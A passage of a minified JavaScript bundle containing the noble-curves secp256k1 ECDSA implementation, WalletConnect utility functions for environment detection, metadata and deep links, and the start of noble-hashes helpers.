fT(t)!==1},unsafeLadder(t,i,n=r.ZERO){let s=t;for(;i>iK;)i&T8&&(n=n.add(s)),s=s.double(),i>>=T8;return n},precomputeWindow(t,i){const{windows:n,windowSize:s}=dT(i,e),o=[];let a=t,c=a;for(let l=0;l<n;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(t,i,n){const{windows:s,windowSize:o}=dT(t,e);let a=r.ZERO,c=r.BASE;const l=BigInt(2**t-1),u=2**t,d=BigInt(t);for(let h=0;h<s;h++){const f=h*o;let p=Number(n&l);n>>=d,p>o&&(p-=u,n+=T8);const g=f,w=f+Math.abs(p)-1,m=h%2!==0,x=p<0;p===0?c=c.add(uT(m,i[g])):a=a.add(uT(x,i[w]))}return{p:a,f:c}},wNAFUnsafe(t,i,n,s=r.ZERO){const{windows:o,windowSize:a}=dT(t,e),c=BigInt(2**t-1),l=2**t,u=BigInt(t);for(let d=0;d<o;d++){const h=d*a;if(n===iK)break;let f=Number(n&c);if(n>>=u,f>a&&(f-=l,n+=T8),f===0)continue;let p=i[h+Math.abs(f)-1];f<0&&(p=p.negate()),s=s.add(p)}return s},getPrecomputes(t,i,n){let s=hT.get(i);return s||(s=this.precomputeWindow(i,t),t!==1&&hT.set(i,n(s))),s},wNAFCached(t,i,n){const s=fT(t);return this.wNAF(s,this.getPrecomputes(s,t,n),i)},wNAFCachedUnsafe(t,i,n,s){const o=fT(t);return o===1?this.unsafeLadder(t,i,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,n),i,s)},setWindowSize(t,i){$se(i,e),Rse.set(t,i),hT.delete(t)}}}function Jtt(r,e,t,i){if(Gtt(t,r),Ztt(i,e),t.length!==i.length)throw new Error("arrays of points and scalars must have equal length");const n=r.ZERO,s=_se(BigInt(t.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(n),l=Math.floor((e.BITS-1)/o)*o;let u=n;for(let d=l;d>=0;d-=o){c.fill(n);for(let f=0;f<i.length;f++){const p=i[f],g=Number(p>>BigInt(d)&BigInt(a));c[g]=c[g].add(t[f])}let h=n;for(let f=c.length-1,p=n;f>0;f--)p=p.add(c[f]),h=h.add(p);if(u=u.add(h),d!==0)for(let f=0;f<o;f++)u=u.double()}return u}function Ose(r){return Wtt(r.Fp),e6(r,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...Tse(r.n,r.nBitLength),...r,p:r.Fp.ORDER})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function nK(r){r.lowS!==void 0&&t3("lowS",r.lowS),r.prehash!==void 0&&t3("prehash",r.prehash)}function Qtt(r){const e=Ose(r);e6(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:t,Fp:i,a:n}=e;if(t){if(!i.eql(n,i.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof t!="object"||typeof t.beta!="bigint"||typeof t.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:Xtt,hexToBytes:ert}=Ltt;class trt extends Error{constructor(e=""){super(e)}}const zh={Err:trt,_tlv:{encode:(r,e)=>{const{Err:t}=zh;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const i=e.length/2,n=Ym(i);if(n.length/2&128)throw new t("tlv.encode: long form length too big");const s=i>127?Ym(n.length/2|128):"";return Ym(r)+s+n+e},decode(r,e){const{Err:t}=zh;let i=0;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[i++]!==r)throw new t("tlv.decode: wrong tlv");const n=e[i++],s=!!(n&128);let o=0;if(!s)o=n;else{const c=n&127;if(!c)throw new t("tlv.decode(long): indefinite length not supported");if(c>4)throw new t("tlv.decode(long): byte length is too big");const l=e.subarray(i,i+c);if(l.length!==c)throw new t("tlv.decode: length bytes not complete");if(l[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(i+=c,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(i,i+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(i+o)}}},_int:{encode(r){const{Err:e}=zh;if(r<Kh)throw new e("integer: negative integers are not allowed");let t=Ym(r);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(r){const{Err:e}=zh;if(r[0]&128)throw new e("invalid signature integer: negative");if(r[0]===0&&!(r[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return Xtt(r)}},toSig(r){const{Err:e,_int:t,_tlv:i}=zh,n=typeof r=="string"?ert(r):r;X4(n);const{v:s,l:o}=i.decode(48,n);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=i.decode(2,s),{v:l,l:u}=i.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(l)}},hexFromSig(r){const{_tlv:e,_int:t}=zh,i=e.encode(2,t.encode(r.r)),n=e.encode(2,t.encode(r.s)),s=i+n;return e.encode(48,s)}},Kh=BigInt(0),Ds=BigInt(1);BigInt(2);const sK=BigInt(3);BigInt(4);function rrt(r){const e=Qtt(r),{Fp:t}=e,i=kse(e.n,e.nBitLength),n=e.toBytes||((g,w,m)=>{const x=w.toAffine();return $y(Uint8Array.from([4]),t.toBytes(x.x),t.toBytes(x.y))}),s=e.fromBytes||(g=>{const w=g.subarray(1),m=t.fromBytes(w.subarray(0,t.BYTES)),x=t.fromBytes(w.subarray(t.BYTES,2*t.BYTES));return{x:m,y:x}});function o(g){const{a:w,b:m}=e,x=t.sqr(g),S=t.mul(x,g);return t.add(t.add(S,t.mul(g,w)),m)}if(!t.eql(t.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(g){return mE(g,Ds,e.n)}function c(g){const{allowedPrivateKeyLengths:w,nByteLength:m,wrapPrivateKey:x,n:S}=e;if(w&&typeof g!="bigint"){if(Ng(g)&&(g=r3(g)),typeof g!="string"||!w.includes(g.length))throw new Error("invalid private key");g=g.padStart(m*2,"0")}let T;try{T=typeof g=="bigint"?g:j1(iu("private key",g,m))}catch{throw new Error("invalid private key, expected hex or "+m+" bytes, got "+typeof g)}return x&&(T=Sa(T,S)),F1("private key",T,Ds,S),T}function l(g){if(!(g instanceof h))throw new Error("ProjectivePoint expected")}const u=vP((g,w)=>{const{px:m,py:x,pz:S}=g;if(t.eql(S,t.ONE))return{x:m,y:x};const T=g.is0();w==null&&(w=T?t.ONE:t.inv(S));const k=t.mul(m,w),I=t.mul(x,w),E=t.mul(S,w);if(T)return{x:t.ZERO,y:t.ZERO};if(!t.eql(E,t.ONE))throw new Error("invZ was invalid");return{x:k,y:I}}),d=vP(g=>{if(g.is0()){if(e.allowInfinityPoint&&!t.is0(g.py))return;throw new Error("bad point: ZERO")}const{x:w,y:m}=g.toAffine();if(!t.isValid(w)||!t.isValid(m))throw new Error("bad point: x or y not FE");const x=t.sqr(m),S=o(w);if(!t.eql(x,S))throw new Error("bad point: equation left != right");if(!g.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class h{constructor(w,m,x){if(this.px=w,this.py=m,this.pz=x,w==null||!t.isValid(w))throw new Error("x required");if(m==null||!t.isValid(m))throw new Error("y required");if(x==null||!t.isValid(x))throw new Error("z required");Object.freeze(this)}static fromAffine(w){const{x:m,y:x}=w||{};if(!w||!t.isValid(m)||!t.isValid(x))throw new Error("invalid affine point");if(w instanceof h)throw new Error("projective point not allowed");const S=T=>t.eql(T,t.ZERO);return S(m)&&S(x)?h.ZERO:new h(m,x,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(w){const m=t.invertBatch(w.map(x=>x.pz));return w.map((x,S)=>x.toAffine(m[S])).map(h.fromAffine)}static fromHex(w){const m=h.fromAffine(s(iu("pointHex",w)));return m.assertValidity(),m}static fromPrivateKey(w){return h.BASE.multiply(c(w))}static msm(w,m){return Jtt(h,i,w,m)}_setWindowSize(w){p.setWindowSize(this,w)}assertValidity(){d(this)}hasEvenY(){const{y:w}=this.toAffine();if(t.isOdd)return!t.isOdd(w);throw new Error("Field doesn't support isOdd")}equals(w){l(w);const{px:m,py:x,pz:S}=this,{px:T,py:k,pz:I}=w,E=t.eql(t.mul(m,I),t.mul(T,S)),C=t.eql(t.mul(x,I),t.mul(k,S));return E&&C}negate(){return new h(this.px,t.neg(this.py),this.pz)}double(){const{a:w,b:m}=e,x=t.mul(m,sK),{px:S,py:T,pz:k}=this;let I=t.ZERO,E=t.ZERO,C=t.ZERO,N=t.mul(S,S),L=t.mul(T,T),$=t.mul(k,k),y=t.mul(S,T);return y=t.add(y,y),C=t.mul(S,k),C=t.add(C,C),I=t.mul(w,C),E=t.mul(x,$),E=t.add(I,E),I=t.sub(L,E),E=t.add(L,E),E=t.mul(I,E),I=t.mul(y,I),C=t.mul(x,C),$=t.mul(w,$),y=t.sub(N,$),y=t.mul(w,y),y=t.add(y,C),C=t.add(N,N),N=t.add(C,N),N=t.add(N,$),N=t.mul(N,y),E=t.add(E,N),$=t.mul(T,k),$=t.add($,$),N=t.mul($,y),I=t.sub(I,N),C=t.mul($,L),C=t.add(C,C),C=t.add(C,C),new h(I,E,C)}add(w){l(w);const{px:m,py:x,pz:S}=this,{px:T,py:k,pz:I}=w;let E=t.ZERO,C=t.ZERO,N=t.ZERO;const L=e.a,$=t.mul(e.b,sK);let y=t.mul(m,T),A=t.mul(x,k),b=t.mul(S,I),v=t.add(m,x),_=t.add(T,k);v=t.mul(v,_),_=t.add(y,A),v=t.sub(v,_),_=t.add(m,S);let O=t.add(T,I);return _=t.mul(_,O),O=t.add(y,b),_=t.sub(_,O),O=t.add(x,S),E=t.add(k,I),O=t.mul(O,E),E=t.add(A,b),O=t.sub(O,E),N=t.mul(L,_),E=t.mul($,b),N=t.add(E,N),E=t.sub(A,N),N=t.add(A,N),C=t.mul(E,N),A=t.add(y,y),A=t.add(A,y),b=t.mul(L,b),_=t.mul($,_),A=t.add(A,b),b=t.sub(y,b),b=t.mul(L,b),_=t.add(_,b),y=t.mul(A,_),C=t.add(C,y),y=t.mul(O,_),E=t.mul(v,E),E=t.sub(E,y),y=t.mul(v,A),N=t.mul(O,N),N=t.add(N,y),new h(E,C,N)}subtract(w){return this.add(w.negate())}is0(){return this.equals(h.ZERO)}wNAF(w){return p.wNAFCached(this,w,h.normalizeZ)}multiplyUnsafe(w){const{endo:m,n:x}=e;F1("scalar",w,Kh,x);const S=h.ZERO;if(w===Kh)return S;if(this.is0()||w===Ds)return this;if(!m||p.hasPrecomputes(this))return p.wNAFCachedUnsafe(this,w,h.normalizeZ);let{k1neg:T,k1:k,k2neg:I,k2:E}=m.splitScalar(w),C=S,N=S,L=this;for(;k>Kh||E>Kh;)k&Ds&&(C=C.add(L)),E&Ds&&(N=N.add(L)),L=L.double(),k>>=Ds,E>>=Ds;return T&&(C=C.negate()),I&&(N=N.negate()),N=new h(t.mul(N.px,m.beta),N.py,N.pz),C.add(N)}multiply(w){const{endo:m,n:x}=e;F1("scalar",w,Ds,x);let S,T;if(m){const{k1neg:k,k1:I,k2neg:E,k2:C}=m.splitScalar(w);let{p:N,f:L}=this.wNAF(I),{p:$,f:y}=this.wNAF(C);N=p.constTimeNegate(k,N),$=p.constTimeNegate(E,$),$=new h(t.mul($.px,m.beta),$.py,$.pz),S=N.add($),T=L.add(y)}else{const{p:k,f:I}=this.wNAF(w);S=k,T=I}return h.normalizeZ([S,T])[0]}multiplyAndAddUnsafe(w,m,x){const S=h.BASE,T=(I,E)=>E===Kh||E===Ds||!I.equals(S)?I.multiplyUnsafe(E):I.multiply(E),k=T(this,m).add(T(w,x));return k.is0()?void 0:k}toAffine(w){return u(this,w)}isTorsionFree(){const{h:w,isTorsionFree:m}=e;if(w===Ds)return!0;if(m)return m(h,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:w,clearCofactor:m}=e;return w===Ds?this:m?m(h,this):this.multiplyUnsafe(e.h)}toRawBytes(w=!0){return t3("isCompressed",w),this.assertValidity(),n(h,this,w)}toHex(w=!0){return t3("isCompressed",w),r3(this.toRawBytes(w))}}h.BASE=new h(e.Gx,e.Gy,t.ONE),h.ZERO=new h(t.ZERO,t.ONE,t.ZERO);const f=e.nBitLength,p=Ytt(h,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:h,normPrivateKeyToScalar:c,weierstrassEquation:o,isWithinCurveOrder:a}}function irt(r){const e=Ose(r);return e6(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function nrt(r){const e=irt(r),{Fp:t,n:i}=e,n=t.BYTES+1,s=2*t.BYTES+1;function o(b){return Sa(b,i)}function a(b){return xP(b,i)}const{ProjectivePoint:c,normPrivateKeyToScalar:l,weierstrassEquation:u,isWithinCurveOrder:d}=rrt({...e,toBytes(b,v,_){const O=v.toAffine(),D=t.toBytes(O.x),R=$y;return t3("isCompressed",_),_?R(Uint8Array.from([v.hasEvenY()?2:3]),D):R(Uint8Array.from([4]),D,t.toBytes(O.y))},fromBytes(b){const v=b.length,_=b[0],O=b.subarray(1);if(v===n&&(_===2||_===3)){const D=j1(O);if(!mE(D,Ds,t.ORDER))throw new Error("Point is not on curve");const R=u(D);let P;try{P=t.sqrt(R)}catch(W){const K=W instanceof Error?": "+W.message:"";throw new Error("Point is not on curve"+K)}const B=(P&Ds)===Ds;return(_&1)===1!==B&&(P=t.neg(P)),{x:D,y:P}}else if(v===s&&_===4){const D=t.fromBytes(O.subarray(0,t.BYTES)),R=t.fromBytes(O.subarray(t.BYTES,2*t.BYTES));return{x:D,y:R}}else{const D=n,R=s;throw new Error("invalid Point, expected length of "+D+", or uncompressed "+R+", got "+v)}}}),h=b=>r3(n3(b,e.nByteLength));function f(b){const v=i>>Ds;return b>v}function p(b){return f(b)?o(-b):b}const g=(b,v,_)=>j1(b.slice(v,_));class w{constructor(v,_,O){this.r=v,this.s=_,this.recovery=O,this.assertValidity()}static fromCompact(v){const _=e.nByteLength;return v=iu("compactSignature",v,_*2),new w(g(v,0,_),g(v,_,2*_))}static fromDER(v){const{r:_,s:O}=zh.toSig(iu("DER",v));return new w(_,O)}assertValidity(){F1("r",this.r,Ds,i),F1("s",this.s,Ds,i)}addRecoveryBit(v){return new w(this.r,this.s,v)}recoverPublicKey(v){const{r:_,s:O,recovery:D}=this,R=I(iu("msgHash",v));if(D==null||![0,1,2,3].includes(D))throw new Error("recovery id invalid");const P=D===2||D===3?_+e.n:_;if(P>=t.ORDER)throw new Error("recovery id 2 or 3 invalid");const B=(D&1)===0?"02":"03",M=c.fromHex(B+h(P)),W=a(P),K=o(-R*W),q=o(O*W),J=c.BASE.multiplyAndAddUnsafe(M,K,q);if(!J)throw new Error("point at infinify");return J.assertValidity(),J}hasHighS(){return f(this.s)}normalizeS(){return this.hasHighS()?new w(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return i3(this.toDERHex())}toDERHex(){return zh.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return i3(this.toCompactHex())}toCompactHex(){return h(this.r)+h(this.s)}}const m={isValidPrivateKey(b){try{return l(b),!0}catch{return!1}},normPrivateKeyToScalar:l,randomPrivateKey:()=>{const b=Pse(e.n);return Ktt(e.randomBytes(b),e.n)},precompute(b=8,v=c.BASE){return v._setWindowSize(b),v.multiply(BigInt(3)),v}};function x(b,v=!0){return c.fromPrivateKey(b).toRawBytes(v)}function S(b){const v=Ng(b),_=typeof b=="string",O=(v||_)&&b.length;return v?O===n||O===s:_?O===2*n||O===2*s:b instanceof c}function T(b,v,_=!0){if(S(b))throw new Error("first arg must be private key");if(!S(v))throw new Error("second arg must be public key");return c.fromHex(v).multiply(l(b)).toRawBytes(_)}const k=e.bits2int||function(b){if(b.length>8192)throw new Error("input is too large");const v=j1(b),_=b.length*8-e.nBitLength;return _>0?v>>BigInt(_):v},I=e.bits2int_modN||function(b){return o(k(b))},E=uB(e.nBitLength);function C(b){return F1("num < 2^"+e.nBitLength,b,Kh,E),n3(b,e.nByteLength)}function N(b,v,_=L){if(["recovered","canonical"].some(ae=>ae in _))throw new Error("sign() legacy options not supported");const{hash:O,randomBytes:D}=e;let{lowS:R,prehash:P,extraEntropy:B}=_;R==null&&(R=!0),b=iu("msgHash",b),nK(_),P&&(b=iu("prehashed msgHash",O(b)));const M=I(b),W=l(v),K=[C(W),C(M)];if(B!=null&&B!==!1){const ae=B===!0?D(t.BYTES):B;K.push(iu("extraEntropy",ae))}const q=$y(...K),J=M;function le(ae){const U=k(ae);if(!d(U))return;const G=a(U),Z=c.BASE.multiply(U).toAffine(),j=o(Z.x);if(j===Kh)return;const Y=o(G*o(J+j*W));if(Y===Kh)return;let se=(Z.x===j?0:2)|Number(Z.y&Ds),ne=Y;return R&&f(Y)&&(ne=p(Y),se^=1),new w(j,ne,se)}return{seed:q,k2sig:le}}const L={lowS:e.lowS,prehash:!1},$={lowS:e.lowS,prehash:!1};function y(b,v,_=L){const{seed:O,k2sig:D}=N(b,v,_),R=e;return Sse(R.hash.outputLen,R.nByteLength,R.hmac)(O,D)}c.BASE._setWindowSize(8);function A(b,v,_,O=$){const D=b;v=iu("msgHash",v),_=iu("publicKey",_);const{lowS:R,prehash:P,format:B}=O;if(nK(O),"strict"in O)throw new Error("options.strict was renamed to lowS");if(B!==void 0&&B!=="compact"&&B!=="der")throw new Error("format must be compact or der");const M=typeof D=="string"||Ng(D),W=!M&&!B&&typeof D=="object"&&D!==null&&typeof D.r=="bigint"&&typeof D.s=="bigint";if(!M&&!W)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let K,q;try{if(W&&(K=new w(D.r,D.s)),M){try{B!=="compact"&&(K=w.fromDER(D))}catch(se){if(!(se instanceof zh.Err))throw se}!K&&B!=="der"&&(K=w.fromCompact(D))}q=c.fromHex(_)}catch{return!1}if(!K||R&&K.hasHighS())return!1;P&&(v=e.hash(v));const{r:J,s:le}=K,ae=I(v),U=a(le),G=o(ae*U),Z=o(J*U),j=c.BASE.multiplyAndAddUnsafe(q,G,Z)?.toAffine();return j?o(j.x)===J:!1}return{CURVE:e,getPublicKey:x,getSharedSecret:T,sign:y,verify:A,ProjectivePoint:c,Signature:w,utils:m}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function srt(r){return{hash:r,hmac:(e,...t)=>Ise(r,e,stt(...t)),randomBytes:ott}}function ort(r,e){const t=i=>nrt({...r,...srt(i)});return{...t(e),create:t}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Bse=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),oK=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),art=BigInt(1),CP=BigInt(2),aK=(r,e)=>(r+e/CP)/e;function crt(r){const e=Bse,t=BigInt(3),i=BigInt(6),n=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=r*r*r%e,u=l*l*r%e,d=zc(u,t,e)*u%e,h=zc(d,t,e)*u%e,f=zc(h,CP,e)*l%e,p=zc(f,n,e)*f%e,g=zc(p,s,e)*p%e,w=zc(g,a,e)*g%e,m=zc(w,c,e)*w%e,x=zc(m,a,e)*g%e,S=zc(x,t,e)*u%e,T=zc(S,o,e)*p%e,k=zc(T,i,e)*l%e,I=zc(k,CP,e);if(!EP.eql(EP.sqr(I),r))throw new Error("Cannot find square root");return I}const EP=kse(Bse,void 0,void 0,{sqrt:crt}),Mse=ort({a:BigInt(0),b:BigInt(7),Fp:EP,n:oK,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:r=>{const e=oK,t=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),i=-art*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),n=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=t,o=BigInt("0x100000000000000000000000000000000"),a=aK(s*r,e),c=aK(-i*r,e);let l=Sa(r-a*t-c*n,e),u=Sa(-a*i-c*s,e);const d=l>o,h=u>o;if(d&&(l=e-l),h&&(u=e-u),l>o||u>o)throw new Error("splitScalar: Endomorphism failed, k="+r);return{k1neg:d,k1:l,k2neg:h,k2:u}}}},Ttt);BigInt(0);Mse.ProjectivePoint;const lrt=Object.freeze(Object.defineProperty({__proto__:null,secp256k1:Mse},Symbol.toStringTag,{value:"Module"}));var urt={};const drt=":";function hw(r){const[e,t]=r.split(drt);return{namespace:e,reference:t}}function Dse(r,e){return r.includes(":")?[r]:e.chains||[]}var hrt=Object.defineProperty,frt=Object.defineProperties,prt=Object.getOwnPropertyDescriptors,cK=Object.getOwnPropertySymbols,grt=Object.prototype.hasOwnProperty,mrt=Object.prototype.propertyIsEnumerable,lK=(r,e,t)=>e in r?hrt(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,uK=(r,e)=>{for(var t in e||(e={}))grt.call(e,t)&&lK(r,t,e[t]);if(cK)for(var t of cK(e))mrt.call(e,t)&&lK(r,t,e[t]);return r},wrt=(r,e)=>frt(r,prt(e));const brt="ReactNative",dc={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},vrt="js";function ox(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Mp(){return!vn.getDocument()&&!!vn.getNavigator()&&navigator.product===brt}function yrt(){return Mp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function xrt(){return Mp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function K3(){return!ox()&&!!vn.getNavigator()&&!!vn.getDocument()}function t6(){return Mp()?dc.reactNative:ox()?dc.node:K3()?dc.browser:dc.unknown}function dK(){var r;try{return Mp()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(r=global.Application)==null?void 0:r.applicationId:void 0}catch{return}}function Crt(r,e){const t=new URLSearchParams(r);for(const i of Object.keys(e).sort())if(e.hasOwnProperty(i)){const n=e[i];n!==void 0&&t.set(i,n)}return t.toString()}function Ert(r){var e,t;const i=Lse();try{return r!=null&&r.url&&i.url&&new URL(r.url).host!==new URL(i.url).host&&(console.warn(`The configured WalletConnect 'metadata.url':${r.url} differs from the actual page url:${i.url}. This is probably unintended and can lead to issues.`),r.url=i.url),(e=r?.icons)!=null&&e.length&&r.icons.length>0&&(r.icons=r.icons.filter(n=>n!=="")),wrt(uK(uK({},i),r),{url:r?.url||i.url,name:r?.name||i.name,description:r?.description||i.description,icons:(t=r?.icons)!=null&&t.length&&r.icons.length>0?r.icons:i.icons})}catch(n){return console.warn("Error populating app metadata",n),r||i}}function Lse(){return oR.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function _rt(){if(t6()===dc.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:t,Version:i}=global.Platform;return[t,i].join("-")}const r=sR();if(r===null)return"unknown";const e=r.os?r.os.replace(" ","").toLowerCase():"unknown";return r.type==="browser"?[e,r.name,r.version].join("-"):[e,r.version].join("-")}function Srt(){var r;const e=t6();return e===dc.browser?[e,((r=vn.getLocation())==null?void 0:r.host)||"unknown"].join(":"):e}function Use(r,e,t){const i=_rt(),n=Srt();return[[r,e].join("-"),[vrt,t].join("-"),i,n].join("/")}function Art({protocol:r,version:e,relayUrl:t,sdkVersion:i,auth:n,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=t.split("?"),u=Use(r,e,i),d={auth:n,ua:u,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},h=Crt(l[1]||"",d);return l[0]+"?"+h}function k1(r,e){return r.filter(t=>e.includes(t)).length===r.length}function _P(r){return Object.fromEntries(r.entries())}function SP(r){return new Map(Object.entries(r))}function n1(r=fe.FIVE_MINUTES,e){const t=fe.toMiliseconds(r||fe.FIVE_MINUTES);let i,n,s,o;return{resolve:a=>{s&&i&&(clearTimeout(s),i(a),o=Promise.resolve(a))},reject:a=>{s&&n&&(clearTimeout(s),n(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},t),i=a,n=c})}}function Uf(r,e,t){return new Promise(async(i,n)=>{const s=setTimeout(()=>n(new Error(t)),e);try{const o=await r;i(o)}catch(o){n(o)}clearTimeout(s)})}function jse(r,e){if(typeof e=="string"&&e.startsWith(`${r}:`))return e;if(r.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(r.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${r}`)}function Irt(r){return jse("topic",r)}function Trt(r){return jse("id",r)}function Fse(r){const[e,t]=r.split(":"),i={id:void 0,topic:void 0};if(e==="topic"&&typeof t=="string")i.topic=t;else if(e==="id"&&Number.isInteger(Number(t)))i.id=Number(t);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${t}`);return i}function bs(r,e){return fe.fromMiliseconds(Date.now()+fe.toMiliseconds(r))}function Sf(r){return Date.now()>=fe.toMiliseconds(r)}function Pi(r,e){return`${r}${e?`:${e}`:""}`}function Sd(r=[],e=[]){return[...new Set([...r,...e])]}async function krt({id:r,topic:e,wcDeepLink:t}){var i;try{if(!t)return;const n=typeof t=="string"?JSON.parse(t):t,s=n?.href;if(typeof s!="string")return;const o=Nrt(s,r,e),a=t6();if(a===dc.browser){if(!((i=vn.getDocument())!=null&&i.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}Prt(o)}else a===dc.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(n){console.error(n)}}function Nrt(r,e,t){const i=`requestId=${e}&sessionTopic=${t}`;r.endsWith("/")&&(r=r.slice(0,-1));let n=`${r}`;if(r.startsWith("https://t.me")){const s=r.includes("?")?"&startapp=":"?startapp=";n=`${n}${s}${Brt(i,!0)}`}else n=`${n}/wc?${i}`;return n}function Prt(r){let e="_self";Ort()?e="_top":(Rrt()||r.startsWith("https://")||r.startsWith("http://"))&&(e="_blank"),window.open(r,e,"noreferrer noopener")}async function $rt(r,e){let t="";try{if(K3()&&(t=localStorage.getItem(e),t))return t;t=await r.getItem(e)}catch(i){console.error(i)}return t}function hK(r,e){if(!r.includes(e))return null;const t=r.split(/([&,?,=])/),i=t.indexOf(e);return t[i+2]}function fK(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,r=>{const e=Math.random()*16|0;return(r==="x"?e:e&3|8).toString(16)})}function dB(){return typeof process<"u"&&urt.IS_VITEST==="true"}function Rrt(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function Ort(){try{return window.self!==window.top}catch{return!1}}function Brt(r,e=!1){const t=Buffer.from(r).toString("base64");return e?t.replace(/[=]/g,""):t}function qse(r){return Buffer.from(r,"base64").toString("utf-8")}function Mrt(r){return new Promise(e=>setTimeout(e,r))}function Ry(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function Drt(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function r6(r,...e){if(!Drt(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function hB(r){if(typeof r!="function"||typeof r.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Ry(r.outputLen),Ry(r.blockLen)}function s3(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function zse(r,e){r6(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const k8=BigInt(2**32-1),pK=BigInt(32);function Lrt(r,e=!1){return e?{h:Number(r&k8),l:Number(r>>pK&k8)}:{h:Number(r>>pK&k8)|0,l:Number(r&k8)|0}}function Urt(r,e=!1){let t=new Uint32Array(r.length),i=new Uint32Array(r.length);for(let n=0;n<r.length;n++){const{h:s,l:o}=Lrt(r[n],e);[t[n],i[n]]=[s,o]}return[t,i]}const jrt=(r,e,t)=>r<<t|e>>>32-t,Frt=(r,e,t)=>e<<t|r>>>32-t,qrt=(r,e,t)=>e<<t-32|r>>>64-t,zrt=(r,e,t)=>r<<t-32|e>>>64-t,um=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function Wrt(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function pT(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}function Yu(r,e){return r<<32-e|r>>>e}const gK=new Uint8Array(new 